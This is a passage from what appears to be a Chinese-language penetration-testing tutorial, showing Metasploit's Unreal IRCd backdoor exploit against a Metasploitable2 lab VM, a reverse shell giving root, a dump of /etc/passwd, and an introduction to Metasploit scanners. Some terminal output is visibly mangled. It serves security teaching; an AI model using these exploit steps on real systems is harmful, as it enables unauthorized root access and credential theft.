
## 扫描器列表

| Name | Date |
| :--- | :--- |
| `auxiliary/scanner/apache` | 2016-02-09 |
| `auxiliary/scanner/sftp` | 2014-05-27 |
| `auxiliary/scanner/fortinet` | 2016-01-09 |
| `auxiliary/scanner/enum` | 2016-03-11 |
| `auxiliary/scanner/juniper` | 2015-12-20 |
| `auxiliary/scanner/ssh` | 2016-05-12 |

## 利用 Unreal IRCd 后门

这就是我们利用所需的所有内容，已经准备好执行。

现在只需输入 `exploit`：

```
msfexploit(unix/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.1.39:4444
[*] 192.168.1.68:6667 - Connected to 192.168.1.68:6667...
[*] :irc.Metasploit.LAN NOTICE AUTH *** Looking up your hostname*
[*] 192.168.1.68:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Command: echo pz55bxbFnyQeF8;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from socket...
[*] Reading from socket B
[*] B: "pz55bxbFnyQeF8\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.1.39:4444 -> 192.168.1.68:44435)
```

利用程序正在运行并打开了一个命令 shell 会话。

## [6] 连接到远程系统

这可能会让人有点困惑，它说打开了一个命令 shell 会话，但你看到的只有一个闪烁的光标。实际上，你正坐在与目标机器连接的远程终端 shell 中！如果你输入 `whoami`，目标系统应该像下面返回 `root`：

```
whoami
root
```

成功了；我们刚刚成功利用了第一个基于 Linux 的系统！Root 用户是 Linux 机器上可以拥有的最高级别用户。所有标准的 Linux 命令在我们获得的 shell 中都可以运行。例如，我们可以显示密码文件的内容：

```
cat /etc/passwd
root:x:0:0:root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin/bin/sh
bin:x:2:2:bin:/bin/sh
sys:x:3:3:sys:/dev/sh
sync:x:4:65534:sync:/bin/sync
games:x:5:60:games:/usr/games/bin/sh
man:x:6:12:man:/var/cache/man
lp:x:7:7:/var/spool/lpd/bin/sh
mail:x:8:8:/var/mail/bin/sh
news:x:9:9:/var/spool/news:/bin/sh
uucp:x:10:10:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin/sh
www-data:x:33:33-data:/var/www:/bin/sh
backup:x:34:34:backup/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:irc:/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/
nbody:x:65534:nobody:nonexistent:/bin/sh
libuid:x:100:101:/var/lib/libuid/bin/sh
dhcp:x:101:102:nonexistent:/bin/sh
```

我们必须破解密码文件才能获取实际密码；我们将在书的稍后的“密码攻击”章节中查看此内容。要结束会话，按下 `Ctrl-c`，然后在提示取消会话时按 `y`。接下来输入 `back` 返回到 msf 提示符，如下：

```
stat:x:14:65534:/var/lib/nfs:/bin/false
snmp:x:15:65534:/var/lib/snmp:/bin/false
^

[*] 192.168.1.68 - Command shell session 1 closed. Reason: User exit
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > back
msf =
```

你可以留在 Metasploit 框架中，因为我们将在下一章中用到它。

## 结论

在本章中，我们涵盖了如何使用 Nmap 查找目标系统的开放端口。我们还看到了如何发现这些端口上运行着哪些服务。然后我们讨论了如何针对漏洞服务寻找并使用利用程序。在下一章中，我们将快速查看 Metasploit 内置的一些扫描器，它们可以帮助我们发现并利用特定的服务。

## 资源

- https://www.offensive-security.com/metasploit-unleashed/
- https://sourceforge.net/projects/metasploitable/
- https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide

## 第10 章：Metasploitable - 第二部分：扫描器

在上一章中，我们通过使用 Nmap 扫描 Metasploitable2 系统以寻找开放端口和服务。这一次，我们将查看 Metasploit 自带的一些内置辅助扫描器。运行 Nmap 扫描产生了大量的开放端口供我们选择。Metasploit 本身带有大量的内置扫描器。这些扫描器允许我们从单台计算机或整个网络中搜索和恢复信息——让我们开始吧！

本教程再次将使用 Kali 系统作为测试平台，并将故意留漏洞的 Metasploitable2 虚拟机作为我们的目标系统。

## 使用扫描器

如果你在上一章退出了，请在 Kali 中启动 Metasploit Framework。要查看有哪些可用的扫描器，只需在 msf 提示符处输入 `search scanner`：

向下阅读庞大的列表以查看可用内容。在本教程中，我们将注意力缩小在发现的常用端口。作为复习，这里是上一章执行的 Nmap 扫描结果。

| PORT | STATE | SERVICE |
| :--- | :--- | :--- |
| 21/tcp | open | ftp |
| 22/tcp | open | ssh |
| 23/tcp | open | telnet |
| 25/tcp | open | smtp |
| 53/tcp | open | dns |
| 80/tcp | open | http |
| 111/tcp | open | rbind |
| 139/tcp | open | netbios |
| 445/tcp | open | ms |

注意 Metasploit 本身带有大量的内置扫描器。这些扫描器允许我们从单台计算机或整个网络中搜索和恢复信息——让我们开始吧！
